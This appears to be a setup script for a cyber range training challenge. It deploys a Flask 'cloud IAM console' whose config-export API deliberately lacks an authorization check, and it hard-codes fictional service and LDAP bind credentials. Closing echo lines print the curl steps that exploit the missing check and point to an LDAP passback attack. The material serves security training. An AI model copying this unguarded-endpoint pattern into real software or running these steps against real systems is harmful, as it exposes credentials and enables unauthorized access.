#!/usr/bin/env bash
# =============================================================================
# RNG-CLD-01 | M5 — cld-iam | setup.sh
# Challenge: Broken Access Control on Cloud IAM Federation Export API
#            Authenticated but missing role check exposes AD integration config
#            containing LDAP bind credentials for on-premise Active Directory
# Network:   11.0.2.50
# Port:      8080 (PUL Cloud IAM Console)
# Pivot In:  cloud-iam-svc:IAm@CLD!2025 (from M4 container image ENV)
# Pivot Out: svc_ldap:Ld@pB1nd#2025! @ cyberange.local (DC: 33.55.55.137)
#            → Starts the Active Directory range (SRV08-WEB LDAP Passback)
# MITRE:     T1078.004 (Valid Accounts: Cloud Accounts)
#            T1199 (Trusted Relationship — AD Federation)
# Ubuntu 22.04 LTS | run deps.sh first.
# =============================================================================
set -euo pipefail
if [[ $EUID -ne 0 ]]; then echo "[!] Must be run as root." >&2; exit 1; fi
command -v python3 >/dev/null 2>&1 || { echo "[!] Run deps.sh first." >&2; exit 1; }

APP_DIR="/opt/pul-iam"
LOG_DIR="/var/log/pul-cloud"
APP_PORT=8080
SERVICE_NAME="pul-iam"

echo "============================================================"
echo "  RNG-CLD-01 | M5-cld-iam | Challenge Setup"
echo "  Prabal Urja Limited — Operation GRIDFALL"
echo "============================================================"

mkdir -p "${APP_DIR}" "${LOG_DIR}"

# ── Flask IAM Console Application ─────────────────────────────────────────────
cat > "${APP_DIR}/app.py" << 'PYEOF'
#!/usr/bin/env python3
"""
PUL Cloud IAM Console — M5 Challenge
Vulnerability: Broken Access Control on /api/v1/integrations/on-prem/export

The endpoint is marked as requiring 'federation_admin' role in the UI,
but the actual authorization check is missing from the code. Any
authenticated user (including cloud-iam-svc with 'iam_user' role) can
call it and receive the full AD federation configuration including the
LDAP bind password — the pivot credential for the AD range.
"""
from flask import (
    Flask, request, render_template_string,
    session, redirect, url_for, jsonify
)
import hashlib, logging, os, json, time

app = Flask(__name__)
app.secret_key = "pul-cloud-iam-secret-rngcld01-2024"

LOG_DIR = "/var/log/pul-cloud"
os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(
    filename=f"{LOG_DIR}/iam.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

def h(p): return hashlib.sha256(p.encode()).hexdigest()

USERS = {
    "iam-admin": {
        "hash": h("IamAdmin@PUL2024!"),
        "name": "IAM Administrator",
        "role": "federation_admin",
        "permissions": ["iam:*", "federation:*"]
    },
    "cloud-iam-svc": {
        "hash": h("IAm@CLD!2025"),
        "name": "Cloud IAM Service Account",
        "role": "iam_user",
        "permissions": ["iam:ListPrincipals", "iam:GetPolicy", "federation:ListIntegrations"]
        # NOTE: 'federation:ExportConfig' is NOT in this user's permissions
        # BUT the endpoint /api/v1/integrations/on-prem/export has no check
    },
}

# ── The pivot data: AD integration configuration ─────────────────────────────
# This is what the misconfigured endpoint leaks.
# Contains LDAP bind credentials for on-premise Active Directory.
# Players use svc_ldap to start the AD range (SRV08-WEB LDAP passback).
AD_INTEGRATION = {
    "integration_id": "int-ad-corp-001",
    "integration_type": "active_directory",
    "name": "PUL Corporate AD — cyberange.local",
    "status": "active",
    "provisioned_by": "terraform/ad-integration-v1.3.2",
    "last_sync": "2024-11-15T08:00:00Z",
    "config": {
        "domain": "cyberange.local",
        "dc_ip": "33.55.55.137",
        "dc_port": 389,
        "use_ssl": False,
        "bind_dn": "CN=svc_ldap,CN=Users,DC=cyberange,DC=local",
        "bind_password": "Ld@pB1nd#2025!",
        "base_dn": "DC=cyberange,DC=local",
        "user_filter": "(&(objectClass=user)(memberOf=CN=CloudUsers,DC=cyberange,DC=local))",
        "group_filter": "(&(objectClass=group)(cn=Cloud*))",
        "attribute_mappings": {
            "username": "sAMAccountName",
            "email": "mail",
            "display_name": "displayName",
            "groups": "memberOf"
        }
    },
    "web_admin_panel": "http://33.55.55.129/admin/",
    "ad_admin_note": "Web admin uses LDAP for auth. Test LDAP connection via admin panel to verify."
}

# Decoy data — other integrations (not useful for pivot)
INTEGRATIONS_LIST = [
    {
        "integration_id": "int-ad-corp-001",
        "name": "PUL Corporate AD — cyberange.local",
        "type": "active_directory",
        "status": "active",
        "access_required": "federation_admin"
    },
    {
        "integration_id": "int-saml-pul-001",
        "name": "PUL SAML IdP — sso.prabalurja.in",
        "type": "saml2",
        "status": "active",
        "access_required": "federation_admin"
    },
    {
        "integration_id": "int-oidc-dev-001",
        "name": "Gitea OIDC — Development Zone",
        "type": "oidc",
        "status": "inactive",
        "access_required": "federation_admin"
    }
]

# ── CSS / Base template ───────────────────────────────────────────────────────
CSS = """
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Arial,sans-serif;background:#060d1f;color:#e2e8f0;min-height:100vh;display:flex;flex-direction:column}
.topbar{background:#03070f;border-bottom:2px solid #6c5ce7;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between}
.brand{display:flex;align-items:center;gap:10px}
.brand-icon{font-size:22px}
.brand-name{color:#6c5ce7;font-size:15px;font-weight:700;letter-spacing:.04em}
.brand-sub{color:rgba(255,255,255,.25);font-size:11px;margin-left:4px}
.topbar-right{font-size:12px;color:rgba(255,255,255,.4);display:flex;align-items:center;gap:16px}
.topbar-right a{color:#6c5ce7;text-decoration:none}
.nav{background:#080f22;border-bottom:1px solid rgba(108,92,231,.15);padding:0 24px;display:flex}
.nav a{color:rgba(255,255,255,.4);font-size:13px;padding:10px 16px;text-decoration:none;border-bottom:2px solid transparent}
.nav a:hover,.nav a.active{color:#6c5ce7;border-color:#6c5ce7}
.main{flex:1;padding:24px;max-width:1100px;margin:0 auto;width:100%}
.page-title{font-size:20px;font-weight:700;color:#6c5ce7;margin-bottom:4px}
.page-sub{font-size:12.5px;color:rgba(255,255,255,.3);margin-bottom:20px}
.card{background:#0a1228;border:1px solid rgba(108,92,231,.2);border-radius:8px;overflow:hidden;margin-bottom:16px}
.card-header{background:#03070f;border-bottom:1px solid rgba(108,92,231,.2);padding:12px 16px;font-size:13px;font-weight:600;color:#6c5ce7}
.card-body{padding:16px}
.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:10px;font-weight:700}
.b-ok{background:rgba(0,184,148,.15);color:#00b894}
.b-warn{background:rgba(253,203,110,.15);color:#fdcb6e}
.b-err{background:rgba(255,107,107,.15);color:#ff6b6b}
.b-info{background:rgba(108,92,231,.2);color:#a29bfe}
.b-lock{background:rgba(107,114,128,.15);color:#9ca3af}
.table{width:100%;border-collapse:collapse;font-size:12.5px}
.table th{text-align:left;padding:8px 12px;background:#03070f;color:#6c5ce7;font-size:10.5px;text-transform:uppercase;letter-spacing:.06em;border-bottom:1px solid rgba(108,92,231,.2)}
.table td{padding:9px 12px;border-bottom:1px solid rgba(108,92,231,.08);color:#e2e8f0}
.table tr:hover td{background:#0d1730}
.input{width:100%;padding:9px 12px;background:#03070f;border:1.5px solid rgba(108,92,231,.3);border-radius:5px;color:#e2e8f0;font-size:13px;outline:none}
.input:focus{border-color:#6c5ce7}
.btn{padding:9px 20px;background:#6c5ce7;color:#fff;border:none;border-radius:5px;font-size:13px;font-weight:700;cursor:pointer}
.alert{padding:10px 14px;border-radius:5px;font-size:13px;margin-bottom:14px}
.alert-err{background:rgba(255,107,107,.08);border:1px solid rgba(255,107,107,.25);color:#ff6b6b}
.alert-info{background:rgba(108,92,231,.08);border:1px solid rgba(108,92,231,.25);color:#a29bfe}
.kv-row{display:flex;gap:12px;padding:8px 0;border-bottom:1px solid rgba(108,92,231,.08);font-size:12.5px}
.kv-row:last-child{border-bottom:none}
.kv-key{width:160px;flex-shrink:0;color:rgba(255,255,255,.4);font-size:12px}
.kv-val{flex:1;font-family:monospace;font-size:12px;color:#a29bfe;word-break:break-all}
.footer{background:#03070f;border-top:1px solid rgba(108,92,231,.15);padding:8px 24px;text-align:center;font-size:10.5px;color:rgba(255,255,255,.2)}
"""

BASE_NAV = """<nav class="nav">
  <a href="/dashboard" {d}>Dashboard</a>
  <a href="/principals" {p}>Principals</a>
  <a href="/policies" {po}>Policies</a>
  <a href="/integrations" {i}>Integrations</a>
  <a href="/audit" {a}>Audit Log</a>
</nav>"""

def nav(active=""):
    return BASE_NAV.format(
        d='class="active"' if active=="d" else "",
        p='class="active"' if active=="p" else "",
        po='class="active"' if active=="po" else "",
        i='class="active"' if active=="i" else "",
        a='class="active"' if active=="a" else "",
    )

def login_required(f):
    from functools import wraps
    @wraps(f)
    def wrapped(*a, **kw):
        if "user" not in session:
            return redirect(url_for("login"))
        return f(*a, **kw)
    return wrapped

def topbar():
    u = session.get("user", {})
    return f"""<div class="topbar">
  <div class="brand">
    <span class="brand-icon">🔐</span>
    <span class="brand-name">PUL CLOUD IAM</span>
    <span class="brand-sub">Identity & Access Management Console</span>
  </div>
  <div class="topbar-right">
    <span>👤 {u.get('name','')} ({u.get('role','')})</span>
    <a href="/logout">Sign Out</a>
  </div>
</div>"""

# ── Routes ────────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return redirect(url_for("dashboard") if "user" in session else url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        u = request.form.get("username", "").strip()
        p = request.form.get("password", "")
        user = USERS.get(u)
        if user and user["hash"] == h(p):
            session["user"] = {"username": u, "name": user["name"],
                               "role": user["role"], "permissions": user["permissions"]}
            logging.info(f"LOGIN_OK|user={u}|src={request.remote_addr}")
            return redirect(url_for("dashboard"))
        logging.warning(f"LOGIN_FAIL|user={u}|src={request.remote_addr}")
        error = "Invalid credentials."
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>PUL Cloud IAM — Sign In</title>
<style>{CSS}</style></head><body>
<div style="display:flex;align-items:center;justify-content:center;min-height:100vh">
<div style="background:#0a1228;border:1px solid rgba(108,92,231,.3);border-radius:10px;width:400px;overflow:hidden">
  <div style="background:#03070f;border-bottom:2px solid #6c5ce7;padding:28px;text-align:center">
    <div style="font-size:48px;margin-bottom:8px">🔐</div>
    <div style="font-size:18px;font-weight:700;color:#6c5ce7">PUL Cloud IAM</div>
    <div style="font-size:11px;color:rgba(255,255,255,.3);margin-top:4px;text-transform:uppercase;letter-spacing:.06em">Identity & Access Management</div>
  </div>
  <div style="padding:24px">
    {'<div class="alert alert-err">'+error+'</div>' if error else ''}
    <form method="POST">
      <div style="margin-bottom:14px"><label style="display:block;font-size:11px;color:rgba(255,255,255,.4);margin-bottom:5px;text-transform:uppercase;letter-spacing:.06em">Username</label>
      <input class="input" name="username" type="text" placeholder="iam-admin or cloud-iam-svc"></div>
      <div style="margin-bottom:16px"><label style="display:block;font-size:11px;color:rgba(255,255,255,.4);margin-bottom:5px;text-transform:uppercase;letter-spacing:.06em">Password</label>
      <input class="input" name="password" type="password" placeholder="Password"></div>
      <button type="submit" class="btn" style="width:100%">Sign In</button>
    </form>
  </div>
</div></div>
</body></html>"""

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/dashboard")
@login_required
def dashboard():
    u = session["user"]
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Dashboard — PUL Cloud IAM</title><style>{CSS}</style></head><body>
{topbar()}{nav('d')}
<div class="main">
<div class="page-title">🔐 IAM Dashboard</div>
<div class="page-sub">PUL Cloud Identity & Access Management — in-south-1</div>
<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px">
  <div style="background:#0a1228;border:1px solid rgba(108,92,231,.2);border-radius:6px;padding:16px;text-align:center">
    <div style="font-size:28px;font-weight:800;color:#6c5ce7">14</div>
    <div style="font-size:10.5px;color:rgba(255,255,255,.3);text-transform:uppercase;letter-spacing:.05em;margin-top:3px">Principals</div>
  </div>
  <div style="background:#0a1228;border:1px solid rgba(108,92,231,.2);border-radius:6px;padding:16px;text-align:center">
    <div style="font-size:28px;font-weight:800;color:#6c5ce7">3</div>
    <div style="font-size:10.5px;color:rgba(255,255,255,.3);text-transform:uppercase;letter-spacing:.05em;margin-top:3px">On-Prem Integrations</div>
  </div>
  <div style="background:#0a1228;border:1px solid rgba(108,92,231,.2);border-radius:6px;padding:16px;text-align:center">
    <div style="font-size:28px;font-weight:800;color:#fdcb6e">2</div>
    <div style="font-size:10.5px;color:rgba(255,255,255,.3);text-transform:uppercase;letter-spacing:.05em;margin-top:3px">Policy Warnings</div>
  </div>
</div>
<div class="card"><div class="card-header">Signed In As</div><div class="card-body">
  <div class="kv-row"><span class="kv-key">Username</span><span class="kv-val">{u['username']}</span></div>
  <div class="kv-row"><span class="kv-key">Role</span><span class="kv-val">{u['role']}</span></div>
  <div class="kv-row"><span class="kv-key">Permissions</span><span class="kv-val">{', '.join(u['permissions'])}</span></div>
</div></div>
</div>
<div class="footer">© 2024 Prabal Urja Limited | PUL Cloud IAM v3.1.0 | in-south-1</div>
</body></html>"""

@app.route("/principals")
@login_required
def principals():
    rows = ""
    for uname, udata in USERS.items():
        badge = 'b-info' if udata['role'] == 'federation_admin' else 'b-lock'
        rows += f"""<tr>
          <td style="font-family:monospace">{uname}</td>
          <td>{udata['name']}</td>
          <td><span class="badge {badge}">{udata['role']}</span></td>
          <td style="font-size:11px;color:rgba(255,255,255,.4)">{', '.join(udata['permissions'][:2])}{'...' if len(udata['permissions'])>2 else ''}</td>
        </tr>"""
    # Decoy service accounts
    decoys = [
        ("svc-platform", "Platform Service Account", "iam_user"),
        ("svc-monitor", "Monitoring Agent", "readonly"),
        ("terraform-cloud", "Terraform Automation", "deployer"),
        ("ci-runner-main", "CI/CD Runner (Main)", "deployer"),
    ]
    for uname, name, role in decoys:
        rows += f"<tr><td style='font-family:monospace'>{uname}</td><td>{name}</td><td><span class='badge b-lock'>{role}</span></td><td style='font-size:11px;color:rgba(255,255,255,.4)'>iam:Get*, iam:List*</td></tr>"
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Principals — PUL Cloud IAM</title><style>{CSS}</style></head><body>
{topbar()}{nav('p')}
<div class="main">
<div class="page-title">👥 IAM Principals</div>
<div class="page-sub">Users and service accounts managed by PUL Cloud IAM</div>
<div class="card"><div class="card-header">All Principals</div><div class="card-body" style="padding:0">
<table class="table"><thead><tr><th>Username</th><th>Display Name</th><th>Role</th><th>Key Permissions</th></tr></thead>
<tbody>{rows}</tbody></table>
</div></div></div>
<div class="footer">© 2024 Prabal Urja Limited | PUL Cloud IAM v3.1.0</div>
</body></html>"""

@app.route("/integrations")
@login_required
def integrations():
    u = session["user"]
    is_admin = u["role"] == "federation_admin"
    rows = ""
    for intg in INTEGRATIONS_LIST:
        export_btn = f'<a href="/integrations/{intg["integration_id"]}/export" style="color:#6c5ce7;font-size:11.5px;text-decoration:none">Export Config</a>' \
                     if is_admin \
                     else f'<span style="color:rgba(255,255,255,.2);font-size:11.5px" title="Requires federation_admin role">🔒 federation_admin</span>'
        rows += f"""<tr>
          <td style="font-family:monospace;font-size:11px">{intg['integration_id']}</td>
          <td>{intg['name']}</td>
          <td><span class="badge b-info">{intg['type']}</span></td>
          <td><span class="badge b-ok">{intg['status']}</span></td>
          <td>{export_btn}</td>
        </tr>"""
    hint = "" if is_admin else """<div class="alert alert-info" style="margin-bottom:16px">
    ℹ Integration config export requires <strong>federation_admin</strong> role. 
    The export API endpoint is <code style="font-family:monospace">/api/v1/integrations/&lt;id&gt;/export</code>.
    </div>"""
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Integrations — PUL Cloud IAM</title><style>{CSS}</style></head><body>
{topbar()}{nav('i')}
<div class="main">
<div class="page-title">🔗 On-Premise Integrations</div>
<div class="page-sub">Active Directory, SAML and OIDC federation configurations</div>
{hint}
<div class="card"><div class="card-header">Registered Integrations</div>
<div class="card-body" style="padding:0">
<table class="table"><thead><tr><th>ID</th><th>Name</th><th>Type</th><th>Status</th><th>Actions</th></tr></thead>
<tbody>{rows}</tbody></table>
</div></div></div>
<div class="footer">© 2024 Prabal Urja Limited | PUL Cloud IAM v3.1.0</div>
</body></html>"""

@app.route("/audit")
@login_required
def audit():
    events = [
        ("2024-11-15 10:44:55", "cloud-iam-svc", "API_ACCESS", "/api/v1/principals", "200"),
        ("2024-11-15 10:43:11", "terraform-cloud", "POLICY_UPDATE", "pul-ci-runner-policy", "200"),
        ("2024-11-15 08:00:01", "iam-admin", "SYNC_AD", "cyberange.local", "200"),
        ("2024-11-15 06:00:00", "svc-monitor", "HEALTH_CHECK", "/api/v1/status", "200"),
        ("2024-11-14 22:00:00", "ci-runner-main", "TOKEN_REFRESH", "cloud-ci-runner", "200"),
    ]
    rows = "".join(f"<tr><td style='font-family:monospace;font-size:11px'>{t}</td><td>{u}</td><td><span class='badge b-info'>{a}</span></td><td style='font-family:monospace;font-size:11px'>{r}</td><td>{s}</td></tr>"
                   for t, u, a, r, s in events)
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Audit Log — PUL Cloud IAM</title><style>{CSS}</style></head><body>
{topbar()}{nav('a')}
<div class="main">
<div class="page-title">📋 Audit Log</div>
<div class="page-sub">IAM access and change events</div>
<div class="card"><div class="card-header">Recent Events</div><div class="card-body" style="padding:0">
<table class="table"><thead><tr><th>Timestamp</th><th>Principal</th><th>Action</th><th>Resource</th><th>Status</th></tr></thead>
<tbody>{rows}</tbody></table></div></div></div>
<div class="footer">© 2024 Prabal Urja Limited | PUL Cloud IAM v3.1.0</div>
</body></html>"""

# ── THE VULNERABLE API ENDPOINT ───────────────────────────────────────────────
@app.route("/api/v1/integrations/<integration_id>/export")
@login_required
def export_integration(integration_id: str):
    """
    VULNERABILITY: Broken Access Control — Missing Authorization Check

    This endpoint is documented as requiring 'federation_admin' role.
    The UI shows a lock icon for non-admin users hinting at the restriction.
    However, the actual server-side role check is ABSENT from this function.

    Any authenticated user (including cloud-iam-svc with 'iam_user' role)
    can call this endpoint directly via curl/API and receive the full
    integration configuration, including the LDAP bind password.

    Fix: Add role check:
      if session['user']['role'] != 'federation_admin':
          return jsonify({'error': 'Insufficient privileges — federation_admin required'}), 403
    """
    user = session.get("user", {})
    logging.warning(
        f"INTEGRATION_EXPORT|integration_id={integration_id}"
        f"|user={user.get('username','?')}|role={user.get('role','?')}"
        f"|src={request.remote_addr}"
        # This should have been blocked for non-federation_admin users
        f"|ACCESS_CONTROL_BYPASS={'YES' if user.get('role') != 'federation_admin' else 'NO'}"
    )

    if integration_id == "int-ad-corp-001":
        return jsonify({
            "status": "success",
            "note": "Export successful — handle with care. Contains LDAP bind credentials.",
            "data": AD_INTEGRATION
        })
    elif integration_id in ["int-saml-pul-001", "int-oidc-dev-001"]:
        return jsonify({
            "status": "success",
            "data": {
                "integration_id": integration_id,
                "type": "saml2",
                "name": "PUL SAML IdP",
                "endpoint": "https://sso.prabalurja.in/saml/idp",
                "note": "Certificate-based — no password credential"
            }
        })
    return jsonify({"error": "Integration not found"}), 404

@app.route("/api/v1/status")
def status():
    return jsonify({"status": "healthy", "version": "3.1.0", "region": "in-south-1"})

@app.route("/api/v1/principals")
@login_required
def api_principals():
    return jsonify({"principals": [
        {"username": u, "role": d["role"]} for u, d in USERS.items()
    ]})

@app.route("/policies")
@login_required
def policies():
    return redirect(url_for("dashboard"))

@app.route("/integrations/<integration_id>")
@login_required
def integration_detail(integration_id):
    return redirect(url_for("integrations"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
PYEOF
chmod +x "${APP_DIR}/app.py"

# ── Systemd service ───────────────────────────────────────────────────────────
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=PUL Cloud IAM Console (M5 — Final Pivot)
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${APP_DIR}
ExecStart=/usr/bin/python3 ${APP_DIR}/app.py
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=${SERVICE_NAME}

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "${SERVICE_NAME}" --quiet
systemctl restart "${SERVICE_NAME}"
sleep 3

# ── Firewall ──────────────────────────────────────────────────────────────────
if command -v ufw &>/dev/null; then
    ufw allow "${APP_PORT}/tcp" comment "PUL Cloud IAM M5" >/dev/null 2>&1 || true
fi

# ── Verification ──────────────────────────────────────────────────────────────
HOST_IP=$(hostname -I | awk '{print $1}')
echo ""
echo "[*] Running verification..."

systemctl is-active --quiet "${SERVICE_NAME}" && \
    echo "[✓] IAM Console service: running" || echo "[✗] IAM not running" >&2

# Health check
HEALTH=$(curl -sf "http://127.0.0.1:${APP_PORT}/api/v1/status" 2>/dev/null \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('status','FAIL'))" \
    2>/dev/null || echo "FAIL")
[[ "${HEALTH}" == "healthy" ]] && echo "[✓] IAM API health: OK" || echo "[✗] IAM API not healthy" >&2

# Confirm the broken access control works (cloud-iam-svc can hit the export endpoint)
# Login as cloud-iam-svc, then call the vulnerable endpoint
COOKIE_JAR=$(mktemp)
LOGIN_RESP=$(curl -sf -c "${COOKIE_JAR}" -X POST "http://127.0.0.1:${APP_PORT}/login" \
    -d "username=cloud-iam-svc&password=IAm%40CLD%212025" \
    -L -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")

EXPORT_RESP=$(curl -sf -b "${COOKIE_JAR}" \
    "http://127.0.0.1:${APP_PORT}/api/v1/integrations/int-ad-corp-001/export" \
    2>/dev/null || echo '{}')
rm -f "${COOKIE_JAR}"

if echo "${EXPORT_RESP}" | grep -q "Ld@pB1nd"; then
    echo "[✓] Broken access control confirmed — cloud-iam-svc can read AD config"
    echo "[✓] AD bind password visible in export response"
else
    echo "[~] Access control check inconclusive"
fi

echo ""
echo "============================================================"
echo "  M5 Setup Complete — cld-iam"
echo "  IAM URL      : http://${HOST_IP}:${APP_PORT}"
echo "  Login        : cloud-iam-svc / IAm@CLD!2025"
echo ""
echo "  CHALLENGE:"
echo "  1. Login as cloud-iam-svc → Integrations page"
echo "  2. Note: Export Config shows 🔒 (UI suggests restriction)"
echo "  3. Call the API directly — authorization check is MISSING:"
echo ""
echo "  curl -s -c /tmp/iam-cookie.txt -X POST \\"
echo "    http://${HOST_IP}:${APP_PORT}/login \\"
echo "    -d 'username=cloud-iam-svc&password=IAm%40CLD%212025' -L -o /dev/null"
echo ""
echo "  curl -s -b /tmp/iam-cookie.txt \\"
echo "    http://${HOST_IP}:${APP_PORT}/api/v1/integrations/int-ad-corp-001/export"
echo ""
echo "  PIVOT CREDENTIAL (Active Directory Range):"
echo "  Domain       : cyberange.local"
echo "  DC IP        : 33.55.55.137"
echo "  Bind Account : svc_ldap"
echo "  Bind Password: Ld@pB1nd#2025!"
echo "  Admin Panel  : http://33.55.55.129/admin/ (SRV08-WEB LDAP Passback)"
echo ""
echo "  NEXT: Start RNG-AD-01 — LDAP Passback attack on SRV08-WEB"
echo "  MITRE: T1078.004 / T1199 (Trusted Relationship — AD Federation)"
echo "============================================================"
